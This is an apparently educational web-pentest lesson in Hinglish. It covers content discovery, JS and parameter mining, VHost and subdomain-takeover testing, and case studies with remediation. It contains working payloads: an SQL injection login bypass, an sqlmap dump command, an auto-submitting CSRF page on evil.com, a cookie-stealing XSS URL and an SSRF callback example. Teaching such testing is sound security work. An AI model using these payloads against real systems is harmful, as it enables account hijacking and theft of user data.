# **🛡️ Day 03: Content Discovery, Advanced Attack Surface Mining & Real-World Exploitation (The Ultimate Masterclass)**

> **Context:** Footprinting ke baad target ki boundary tayyar hoti hai. Ab hum **Content Discovery**, **API & JavaScript Mining**, **Automated Recon Pipelines (RedAmon Architecture)**, aur **Real-World Exploitation Case Studies (A1 Digital Live Pentest Report)** ko master karenge.

---

## **📑 TABLE OF CONTENTS**

1. **Content Discovery Fundamentals (Manual + OSINT + Automation)**
2. **Next-Gen Asset & Parameter Mining (The Enterprise Pipeline)**
3. **Advanced Attack Surfaces: VHost, SNI & Subdomain Takeovers**
4. **Real-World Pentest Report Case Studies (Live Exploit PoCs)**
5. **OWASP WSTG v4.2 Master Testing Checklist**
6. **CVSS v3.1 Scoring & Professional Bug Bounty Reporting**

---

## **1. Content Discovery Fundamentals**

Content Discovery ka matlab hai web server par wo hidden files, directories, admin panels aur backups dhoondhna jo public UI me link nahi hain.

                      CONTENT DISCOVERY TRIAD

                                 │

     ┌───────────────────────────┼───────────────────────────┐

     ↓                           ↓                           ↓

1. MANUAL DISCOVERY         2. OSINT DISCOVERY          3. AUTOMATED FUZZING

(robots, sitemap, favicon) (Wayback, Google Dorks, S3) (ffuf, gobuster, dirsearch)

---

### **A. Manual Discovery (Quick Wins)**

#### **1. `robots.txt`**

- **Purpose:** Search engine crawlers ko batata hai ki kaunse paths index **nahi** karne.
- **Hacker Insight:** Developers aksar admin panels, staging portals ya backup folders ko hide karne ke liye yahan `Disallow` kar dete hain.
- **Access:** `http://target.com/robots.txt`
    
    text
    
    User-agent: *
    
    Disallow: /staff-portal/
    
    Disallow: /admin-backup/
    

#### **2. Favicon Hashing (Framework Fingerprinting)**

Web frameworks (Spring Boot, Django, cgiirc, Jenkins) default favicon chor dete hain. Uska MD5/MMH3 hash nikal kar framework aur exact software pehchana ja sakta hai.

- **MD5 Hash CLI:**
    
    bash
    
    curl -s https://target.com/images/favicon.ico | md5sum
    
    _(Hash ko [OWASP Favicon Database](https://wiki.owasp.org/index.php/OWASP_favicon_database) se match karein)._
- **Shodan MMH3 Hash (Python):**
    
    python
    
    import mmh3, requests, codecs
    
    response = requests.get('https://target.com/favicon.ico')
    
    favicon = codecs.encode(response.content, "base64")
    
    hash = mmh3.hash(favicon)
    
    print(f"http.favicon.hash:{hash}")
    
    _(Shodan me `http.favicon.hash:<hash>` search karke target ke sare hidden servers ek second me mil jate hain)._

#### **3. `sitemap.xml`**

- **Purpose:** Target ki sabhi important URLs ki list.
- **Hacker Insight:** Purane legacy pages, forgot endpoints, ya hidden routes jaise `/s3cr3t-area` yahan milte hain.
- **Access:** `http://target.com/sitemap.xml`

#### **4. Verbose HTTP Headers Inspection**

Server response headers me technology aur internal flags leak hote hain:

bash

curl -I -v https://target.com

- **Headers to check:**
    - `Server: Apache/2.4.49 (Ubuntu)` (Exact version leak)
    - `X-Powered-By: PHP/7.4.3` (Runtime environment)
    - `X-Backend-Server: web-node-04.internal` (Internal host naming)
    - Custom headers jaise `X-FLAG` ya debug routing markers.

---

### **B. OSINT Content Discovery**

1. **Wayback Machine & CDX API:**
    
    bash
    
    # CDX API Query for historical paths
    
    curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey"
    
    - Internet Archive se target ke saal purane active endpoints nikalna:
2. **Amazon S3 Buckets Enumeration:**
    - URL format: `https://[bucket-name].s3.amazonaws.com`
    - Target ke patterns: `target-assets`, `target-backup`, `target-dev`, `target-public`.
    - Misconfigured permissions check: Read (`ListBucket`), Write (`PutObject`).
3. **GitHub Recon (Code Leaks):**
    - Target organization ke public repos me search karein:
        - `target.com "password"`
        - `target.com "api_key"`
        - `filename:.env DB_HOST`

---

### **C. Automated Content Discovery (Fuzzing)**

Wordlists ke zariye high-speed par endpoints request bhej kar check karna.

bash

# 1. FFUF (Fuzz Faster U Fool) - Fastest & Most Versatile

ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \

     -u https://target.com/FUZZ \

     -mc 200,204,301,302,307,401,403 \

     -c -v

# 2. Gobuster (Standard Dir Scanning)

gobuster dir -u https://target.com/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50

# 3. Smart Fuzzing (Crawl First, then Fuzz subdirectories)

# Pehle Katana se directories nikalein (/api/, /admin/), fir unke aage fuzz karein:

ffuf -w wordlist.txt -u https://target.com/api/v1/FUZZ

---

## **2. Next-Gen Asset & Parameter Mining (Enterprise Pipeline)**

Modern SPAs (React, Vue, Next.js) aur Microservices me puraani directory bruteforcing fail ho jati hai kyunki routes JavaScript aur APIs ke andar dafan hote hain.

┌─────────────────┐       ┌─────────────────┐       ┌─────────────────┐

│ CRAWLERS        │ ────► │ STATIC JS AST   │ ────► │ HIDDEN PARAMS   │

│ Katana / Hakraw │       │ jsluice / Recon │       │ Arjun           │

└─────────────────┘       └─────────────────┘       └─────────────────┘

         │                         │                         │

         ▼                         ▼                         ▼

   Active URLs               API Endpoints &           Ghost Params for

   & Forms                   Hardcoded Secrets         DAST / IDOR Fuzz

### **A. Web Crawlers Comparison**

|Tool|Engine|Strengths|Use Case|
|---|---|---|---|
|**Katana**|Go (goquery) + Optional Headless Chromium|Fast, Form action & field parser, Scope control|Primary discovery on standard & dynamic apps|
|**Hakrawler**|Lightweight Go (colly)|Ultra-fast, simple stdin pipe, multi-container scaling|Fast sweep across large lists of BaseURLs|
|**ZAP Ajax Spider**|Headless Firefox / Chromium|Clicks UI, handles SPA routing (`history.pushState`), dynamic DOM reveals|Complex SPAs & authenticated post-login dashboards|

---

### **B. JavaScript Static Analysis (AST & Secret Extraction)**

Frontend bundle files (`app.bundle.js`, `main.[hash].js`) goldmine hain.

#### **1. `jsluice` (Abstract Syntax Tree Analysis)**

Tree-sitter parser use karta hai (regex nahi) taaki dynamic URL construction ko trace kar sake:

javascript

// Aise dynamic patterns jsluice pakad leta hai:

const url = '/api/v1/' + userId + '/update';

- **Extraction:** API Endpoints + Secrets (AWS keys, JWT tokens, GCP JSONs).

#### **2. Deep JS Recon 7-Pass Engine:**

1. **Live Secret Validation:** Sirf pattern match nahi, balki AWS STS ya GitHub API ko 1 safe ping bhej kar verify karna ki key live hai ya dead.
2. **Source Map Hunting:** `app.js.map` dhoondhna. Agar source map exposed hai, toh developer ka original **unminified source code** recover ho jata hai!
3. **Dependency Confusion:** Scoped npm packages (`@company/private-utils`) ko check karna ki kya ye public npm registry me unclaimed hain.
4. **DOM XSS Sinks Hunting:** Dangerous sinks ko flag karna: `innerHTML`, `outerHTML`, `document.write`, `eval()`, `setTimeout(string)`.
5. **AI/LLM SDK Discovery:** Modern apps me OpenAI (`sk-...`), Anthropic, LangChain, Vercel AI SDK imports aur `dangerouslyAllowBrowser: true` leaks check karna.

---

### **C. Parameter Mining with Arjun (Response Differential Analysis)**

Developers purane endpoints ya debug flags ko code me chhod dete hain jo UI me nahi dikhte (Ghost Parameters):

- `?debug=true` ➔ Stack trace ya auth bypass
- `?admin=1` ➔ Admin UI enable
- `?userId=105` ➔ IDOR data leak
- `?callback=http://evil.com` ➔ SSRF / Open Redirect

#### **Kaise kaam karta hai?**

1. Baseline request bhej kar normal response size aur hash record karta hai.
2. 25,000 common parameter names inject karta hai.
3. Jab response me koi farq (differential) aata hai, toh samajh jata hai ki backend is parameter ko process kar raha hai!

bash

# Arjun GET parameter discovery

arjun -u https://target.com/api/profile --methods GET

# Arjun JSON Body parameter discovery (POST APIs)

arjun -u https://target.com/api/update --methods JSON

---

### **D. API Route Discovery with Kiterunner**

Normal wordlists generic hoti hain (`/admin`, `/test`). **Kiterunner** real-world Swagger/OpenAPI specs se bani `.kite` wordlists use karta hai:

bash

# High-speed API bruteforcing with OpenAPI datasets

kr scan https://api.target.com -w routes-large.kite --max-connection-per-host 50

- **Method Detection:** Sirf `GET` nahi, balki `POST`, `PUT`, `DELETE` bhi check karta hai taaki direct unauthorized write operations mil sakein.

---

## **3. Advanced Attack Surfaces: VHost, SNI & Subdomain Takeovers**

### **A. Virtual Host (VHost) & TLS SNI Enumeration**

Ek hi IP par multiple applications host ho sakti hain. Server decide karta hai ki kaunsi site dikhani hai based on:

1. **L7 HTTP `Host:` Header** (Apache/Nginx classic vhosts).
2. **L4 TLS SNI (Server Name Indication)** (Cloudflare, AWS ALB, Traefik, K8s Ingress).

Target IP: 203.0.13.64

Probe 1 (L7 Probe):

curl -H "Host: admin.example.com" https://203.0.13.64/

Probe 2 (L4 SNI Probe):

curl --resolve admin.example.com:443:203.0.13.64 https://admin.example.com/

> 🚨 **Critical Bug — Host Header Routing Inconsistency (`host_header_bypass`):**  
> Agar L7 probe aur L4 probe alag-alag response dein, iska matlab reverse proxy aur backend origin ke beech mismatch hai. Isse WAF aur IP-whitelisting bypass ho sakti hai!

---

### **B. Subdomain Takeover (Deep Dive)**

Subdomain Takeover tab hota hai jab DNS record (CNAME, NS, MX) kisi aisi external 3rd-party service par point kar raha ho jo ya toh delete ho chuki hai ya expire ho chuki hai.

takeover.example.com ──► CNAME ──► exampletrafficmanager.trafficmanager.net

                                            │

                                            ▼

                               [ UNCLAIMED / DELETED IN AZURE ]

                                            │

                               Attacker claims this name in Azure!

                                            │

                                            ▼

Attacker controls: https://takeover.example.com

#### **High-Risk Takeover Providers:**

- **Microsoft Azure Traffic Manager:** `*.trafficmanager.net`
- **GitHub Pages:** `*.github.io` ("There isn't a GitHub Pages site here")
- **AWS S3:** `*.s3.amazonaws.com` ("NoSuchBucket")
- **Heroku:** `*.herokuapp.com` ("No such app")

---

## **4. Real-World Pentest Report Case Studies (From Live Audit)**

Neeche diye gaye cases A1 Digital ke professional security assessment report par based hain. Ye real-world bug hunting ke best practical examples hain:

---

### **🔴 Case Study 1: Critical Blind/Error-Based SQL Injection (CVSS 10.0)**

- **Vulnerable Endpoint:** `POST /cgi-bin/badstore.cgi?action=login`
- **Affected Asset:** `shop.example.com` (IP: 203.0.13.65:443)
- **Vulnerable Parameter:** `username`

#### **Step-by-Step Exploitation:**

**1. Syntax Error Triggering (Error-Based Proof):** Jab `username` me single quote (`'`) bheja gaya:

http

POST /cgi-bin/badstore.cgi?action=login HTTP/1.1

Host: shop.example.com

Content-Type: application/x-www-form-urlencoded

username=%27&passwd=aaa

**Server Response:**

text

Software error:

DBI::mysql::st execute failed: You have an error in your SQL syntax; check the manual that corresponds...

_(Iss error ne confirm kiya ki raw user input directly database engine me execute ho raha hai)._

**2. Authentication Bypass PoC:** Password jaane bina admin account login kiya gaya:

bash

curl -X POST \

  -F "username=admin'AND'1'='1'--" \

  -F "passwd=aaa" \

  'https://shop.example.com/cgi-bin/badstore.cgi?action=login'

**3. Data Exfiltration via SQLMap:**

bash

sqlmap -u "https://shop.example.com/cgi-bin/badstore.cgi?action=login" \

       --data="username=admin&passwd=aaa" \

       -p username --dbms=MySQL --dump -T userdb

- **Impact:** 1,241 users ke private addresses, emails, aur hashed passwords dump ho gaye. Multiple queries chain karke (semicolon `;` use karke) tables delete ya modify bhi kiye ja sakte the!
- **Remediation:** Parameterized queries (Prepared Statements) use karein.

---

### **🟠 Case Study 2: High-Severity Account Takeover via CSRF (CVSS 7.1)**

- **Vulnerable Endpoint:** `POST /account/edit_profile`
- **Root Cause:** Profile edit request me koi CSRF token nahi tha aur session cookie me `SameSite` attribute missing tha.

#### **Exploit PoC (Auto-Submitting HTML Form):**

Attacker ne ek malicious website (`evil.com`) par ye code host kiya:

html

<!DOCTYPE html>

<html>

<head>

    <title>Win iPhone 16!</title>

</head>

<body>

    <h1>Loading prize...</h1>

    <!-- Hidden Auto-Submitting CSRF Form -->

    <form action="https://shop.example.com/account/edit_profile" method="POST" name="csrfForm">

        <input type="hidden" name="email" value="attacker@evil.com" />

        <input type="hidden" name="btn_save" value="Save" />

    </form>

    <script>

        // Jaise hi victim page kholega, request background me shoot ho jayegi

        document.csrfForm.submit();

    </script>

</body>

</html>

- **Attack Flow:**
    1. Victim ne `shop.example.com` par login kiya hua tha.
    2. Usne attacker ka link click kiya.
    3. Victim ke browser ne automatically shop ke cookies ke sath email update request bhej di.
    4. Email change ho kar `attacker@evil.com` ho gaya.
    5. Attacker ne "Forgot Password" dabaya aur account hijack kar liya!
- **Remediation:** Unique, cryptographically strong Anti-CSRF tokens implement karein aur cookies par `SameSite=Strict` ya `Lax` lagayein.

---

### **🟡 Case Study 3: Subdomain Takeover on Microsoft Azure (CVSS 6.5)**

- **Vulnerable Domain:** `takeover.example.com`
- **Discovery:**
    
    bash
    
    nslookup takeover.example.com 8.8.8.8
    
    **Output:**
    
    text
    
    takeover.example.com canonical name = exampletrafficmanager.trafficmanager.net
    
    Address: 54.192.96.244
    
- **Vulnerability:** `exampletrafficmanager.trafficmanager.net` Azure subscription me delete ho chuka tha, lekin DNS CNAME record ko remove nahi kiya gaya tha.
- **Exploitation:** Attacker ne apna Azure account khola, naya Traffic Manager Profile banaya jiska naam `exampletrafficmanager` rakha aur apni Web App link kar di.
- **Result:** `https://takeover.example.com` par attacker ka content live ho gaya! Iska use credential phishing ke liye kiya ja sakta tha.
- **Remediation:** DNS CNAME records ko delete karein jo decommissioned infrastructure par point kar rahe hain.

---

### **🟡 Case Study 4: Reflected Cross-Site Scripting (XSS) (CVSS 6.1)**

- **Vulnerable Endpoint:** `https://www.example.com/app?search_query=...`
- **PoC URL:**
    
    text
    
    https://www.example.com/app?search_query="><script>alert(document.cookie)</script>
    
- **Mechanism:** Server ne `search_query` parameter ko unfiltered HTML body me reflect back kar diya.
- **Impact:** Session token theft (`session_id=481aed4f-...`) aur account takeover.
- **Remediation:** Context-aware HTML entity output encoding lagayein:

|Special Character|Safe Encoded Entity|
|---|---|
|`&`|`&amp;`|
|`<`|`&lt;`|
|`>`|`&gt;`|
|`"`|`&quot;`|
|`'`|`&#x27;`|
|`/`|`&#x2F;`|

---

### **🔵 Case Study 5: Infrastructure & Config Flaws**

1. **Information Disclosure via 404 (Outdated Tomcat):**
    - Non-existent URL `https://shop.example.com/nonexistent` hit karne par Apache Tomcat error page ne version leak kiya: `Apache Tomcat/8.0.41`
    - Tomcat 8.0 EOL (End of Life) hai aur multiple known vulnerabilities se affected hai. Custom generic 404 page lagana zaroori hai.
2. **Missing Security Headers:**
    - `Content-Security-Policy (CSP)`: XSS execution rokta hai.
    - `X-Frame-Options: DENY`: Clickjacking iframe embedding rokta hai.
    - `X-Content-Type-Options: nosniff`: MIME-type sniffing bypass rokta hai.
    - `Strict-Transport-Security (HSTS)`: SSL Stripping (Downgrade) attacks rokta hai.
3. **Weak SSL/TLS Configuration:**
    - Legacy protocols enabled the: SSLv2, SSLv3, TLS 1.0 (with RC4 cipher).
    - Remediation: Sirf TLS 1.2 aur TLS 1.3 allow karein with modern AEAD cipher suites.

---

## **5. OWASP WSTG v4.2 Master Testing Checklist**

Professional pentesting me is standard checklist ke mutabiq testing execute hoti hai:

├── [1. INFORMATION GATHERING]

│   ├── WSTG-INFO-01: Search Engine Discovery & Leaks

│   ├── WSTG-INFO-02: Web Server Fingerprinting

│   ├── WSTG-INFO-03: Webserver Metafiles (robots.txt, sitemap.xml)

│   ├── WSTG-INFO-05: Webpage Source Code & Comments Review

│   └── WSTG-INFO-08: Application Framework Fingerprinting

│

├── [2. CONFIGURATION & DEPLOYMENT]

│   ├── WSTG-CONF-04: Old Backup & Unreferenced Files (.bak, .old, .zip)

│   ├── WSTG-CONF-06: HTTP Methods Testing (OPTIONS, PUT, DELETE)

│   ├── WSTG-CONF-07: HTTP Strict Transport Security (HSTS)

│   └── WSTG-CONF-10: Subdomain Takeover Testing

│

├── [3. AUTHENTICATION & SESSIONS]

│   ├── WSTG-ATHN-02: Default Credentials Check

│   ├── WSTG-ATHN-03: Weak Lockout / Brute Force Testing

│   ├── WSTG-SESS-02: Cookie Attributes (Secure, HttpOnly, SameSite)

│   └── WSTG-SESS-05: Cross-Site Request Forgery (CSRF)

│

├── [4. AUTHORIZATION TESTING]

│   ├── WSTG-ATHZ-01: Directory Traversal / File Inclusion (LFI/RFI)

│   ├── WSTG-ATHZ-02: Bypassing Authorization Schema

│   ├── WSTG-ATHZ-03: Privilege Escalation (User -> Admin)

│   └── WSTG-ATHZ-04: Insecure Direct Object References (IDOR/BOLA)

│

├── [5. INPUT VALIDATION]

│   ├── WSTG-INPV-01: Reflected Cross-Site Scripting (XSS)

│   ├── WSTG-INPV-02: Stored Cross-Site Scripting (XSS)

│   ├── WSTG-INPV-05: SQL Injection Testing

│   ├── WSTG-INPV-12: Command Injection Testing

│   └── WSTG-INPV-19: Server-Side Request Forgery (SSRF)

│

└── [6. BUSINESS LOGIC TESTING]

    ├── WSTG-BUSL-01: Business Logic Data Validation

    ├── WSTG-BUSL-02: Ability to Forge Requests

    └── WSTG-BUSL-05: Function Use Rate Limits & Race Conditions

---

## **6. CVSS v3.1 Scoring & Professional Reporting Blueprint**

### **A. CVSS v3.1 Metrics Breakdown**

Har bug ka severity score (0.0 to 10.0) calculate hota hai:

BaseScore=f(Exploitability,Impact)BaseScore = f(\text{Exploitability}, \text{Impact})BaseScore=f(Exploitability,Impact)

- **Attack Vector (AV):** Network [N], Adjacent [A], Local [L], Physical [P]
- **Attack Complexity (AC):** Low [L], High [H]
- **Privileges Required (PR):** None [N], Low [L], High [H]
- **User Interaction (UI):** None [N], Required [R]
- **Scope (S):** Unchanged [U], Changed [C]
- **Confidentiality (C):** None [N], Low [L], High [H]
- **Integrity (I):** None [N], Low [L], High [H]
- **Availability (A):** None [N], Low [L], High [H]

#### **Severity Scale:**

- **0.0:** None
- **0.1 – 3.9:** Low
- **4.0 – 6.9:** Medium
- **7.0 – 8.9:** High
- **9.0 – 10.0:** Critical

---

### **B. Professional Bug Bounty Report Template (HackerOne / Bugcrowd)**

markdown

# [Vulnerability Type] on [Vulnerable Endpoint] leading to [Impact]

## 1. Summary

[Ek paragraph me clear explain karein ki bug kya hai aur kahan mila].

## 2. Severity & CVSS Score

- **Severity:** High / Critical

- **CVSS v3.1 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (Score: 7.5)

## 3. Vulnerable Asset & Endpoint

- **URL:** https://target.com/api/v1/user/profile

- **HTTP Method:** GET

- **Parameter:** `userId`

## 4. Step-by-Step Reproduction Steps

1. Navigate to `https://target.com/login` and log in as User A (`userId: 1001`).

2. Intercept the profile request in Burp Suite: `GET /api/v1/user/profile?userId=1001`.

3. Change the `userId` parameter to `1002` (User B's ID).

4. Send the modified request to the server.

5. Observe that User B's full private data (SSN, home address, phone) is returned in the response.

## 5. Proof of Concept (PoC)

[Attach HTTP Request/Response or Screenshots/Video]

## 6. Business Impact

[Kyu ye company ke liye khatarnak hai: Data breach, compliance violation, financial loss].

## 7. Recommended Remediation

[Developers ke liye actionable fix: Session validation, parameterized queries, etc.].